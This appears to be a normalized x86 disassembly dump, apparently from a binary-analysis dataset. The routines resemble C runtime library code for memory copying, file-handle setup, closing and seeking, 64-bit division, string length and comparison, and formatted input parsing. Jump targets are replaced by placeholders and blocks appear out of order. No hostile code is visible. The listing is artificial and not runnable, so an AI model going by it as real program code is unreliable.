call sub_404a6a
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40b59f
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_404a6a
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40b554
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_40ec82
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40b660
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40b6e8 ]
jmp [ ecx * 4 + jump_table_40b768 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b7d4 ]
pop esi
pop edi
pop ebp
jmp sub_411003
jmp [ ecx * 4 + jump_table_40b970 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40b874 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b970 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40b7d4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40b970 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b7d4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b7d4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b7d4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b970 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b970 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b970 ]
sub_40b9c5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_4108d2
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_407f8a
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_4108d2
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_4108d2
push 0x1
mov edi eax
call sub_4108d2
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_41084c
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_40ba61
push 0x10
push r--data
call sub_4099f4
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_407f77
and [ eax ] 0x0
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] edi
call sub_407f64
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_407efc
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_409a39
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_410949
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_407f64
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_40b9c5
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bb24
mov eax [ ebp - 0x1c ]
sub_40bb2e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_404d8e
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40bb5f
push 0x54
push r--data
call sub_4099f4
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_40ed09
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_40ed09
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_409a39
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_40df76
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_40df76
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_40bdb3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_4108d2
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_407f64
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_407f8a
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_40be28
push 0x10
push r--data
call sub_4099f4
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_407f77
and [ eax ] 0x0
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] edi
call sub_407f64
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_407efc
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_409a39
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_410949
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bdb3
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40befa
mov eax [ ebp - 0x1c ]
sub_40bf10
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40bf80
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_40bff0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40c07b
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_40eda3
add esp 0xc
test eax eax
je r-xdata
call sub_40ed09
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_40b660
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_40c0d2
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_411137
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_40c11b
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_41123c
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_40c0f2
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_40c145
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x1e4 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x19c ] eax
mov [ ebp - 0x1ac ] ecx
mov [ ebp - 0x1dc ] 0x15e
mov [ ebp - 0x1d0 ] esi
mov [ ebp - 0x1e8 ] esi
mov [ ebp - 0x188 ] esi
cmp edi esi
jne r-xdata
cmp eax esi
je r-xdata
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4061c0
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x1f8 ]
call sub_404a6a
mov al [ edi ]
mov [ ebp - 0x19d ] 0x0
mov [ ebp - 0x18c ] esi
mov [ ebp - 0x1c4 ] esi
test al al
je r-xdata
push eax
call sub_40b01d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
mov esi [ ebp - 0x19c ]
movzx eax al
push eax
call sub_41123c
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1f0 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edi ]
cmp al 0x25
jne r-xdata
dec [ ebp - 0x18c ]
push esi
push esi
lea esi [ ebp - 0x18c ]
call sub_40c11b
pop ecx
push eax
call sub_40c108
pop ecx
pop ecx
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_40c0f2
mov ebx eax
movzx eax [ edi ]
inc edi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x1b8 ] edi
cmp eax ebx
jne r-xdata
cmp [ edi + 0x1 ] al
je r-xdata
inc edi
movzx eax [ edi ]
push eax
call sub_41123c
pop ecx
test eax eax
jne r-xdata
jmp r-xdata
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
push esi
push ebx
jmp r-xdata
movzx eax bl
push eax
call sub_40b58c
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor esi esi
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1a8 ] esi
mov [ ebp - 0x1b4 ] esi
mov [ ebp - 0x194 ] esi
mov [ ebp - 0x19f ] 0x0
mov [ ebp - 0x1a0 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1ad ] 0x0
mov [ ebp - 0x19e ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x1d8 ] esi
mov al [ edi ]
test al al
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_40c108
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_40c0f2
movzx ecx [ edi ]
inc edi
mov [ ebp - 0x1b8 ] edi
cmp ecx eax
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x25
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x194 ]
inc [ ebp - 0x1b4 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x194 ] eax
jmp r-xdata
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
cmp [ edi ] 0x25
jne r-xdata
push esi
push eax
call sub_40c108
push esi
push ebx
call sub_40c108
add esp 0x10
dec [ ebp - 0x18c ]
mov edi eax
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x1ad ] 0x0
je r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1ac ]
call sub_404d8e
pop ecx
mov eax [ ebp - 0x1b8 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
dec [ ebp - 0x195 ]
dec [ ebp - 0x18d ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc edi
movzx ebx [ edi ]
movzx eax bl
push eax
call sub_411137
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b8 ] edi
jne r-xdata
mov eax [ ebp - 0x1c4 ]
test eax eax
jne r-xdata
mov edi eax
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor esi esi
mov eax [ ebp - 0x1e4 ]
mov esi [ eax ]
mov [ ebp - 0x1fc ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
cmp [ ebp - 0x19d ] al
jne r-xdata
inc [ ebp - 0x1d8 ]
mov edi eax
mov [ ebp - 0x1cc ] esi
mov [ ebp - 0x1c8 ] esi
jmp r-xdata
inc [ ebp - 0x195 ]
inc [ ebp - 0x18d ]
jmp r-xdata
inc [ ebp - 0x1ad ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx eax [ edi ]
or eax 0x20
mov [ ebp - 0x1a4 ] eax
cmp eax 0x6e
je r-xdata
mov al [ edi ]
cmp al 0x53
je r-xdata
xor bl bl
mov [ ebp - 0x1bc ] esi
cmp [ ebp - 0x18d ] bl
jne r-xdata
mov ecx [ ebp - 0x1f0 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
mov cl [ edi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1b4 ]
test ecx ecx
je r-xdata
cmp eax 0x63
je r-xdata
mov [ ebp - 0x18d ] 0x1
mov [ ebp - 0x18d ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x195 ]
jmp r-xdata
mov eax [ ebp - 0x1a4 ]
cmp eax 0x6f
jg r-xdata
cmp [ ebp - 0x194 ] 0x0
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
cmp eax 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
sub eax 0x70
je r-xdata
je r-xdata
push [ ebp - 0x19c ]
push [ ebp - 0x188 ]
mov esi [ ebp - 0x1bc ]
mov edi [ ebp - 0x1b8 ]
push [ ebp - 0x19c ]
lea esi [ ebp - 0x18c ]
call sub_40c11b
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x195 ] 0x1
sub eax 0x3
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp eax 0x63
je r-xdata
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x1a0 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
push 0x64
pop edx
cmp eax edx
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
mov edi [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push edi
push [ ebp - 0x188 ]
mov [ ebp - 0x1c0 ] esi
call sub_40c108
pop ecx
pop ecx
mov [ ebp - 0x19e ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x194 ]
mov [ ebp - 0x1b4 ] 0x1
jle r-xdata
cmp cl 0x58
jne r-xdata
mov edi [ ebp - 0x1c0 ]
test bl bl
jne r-xdata
test bl bl
jne r-xdata
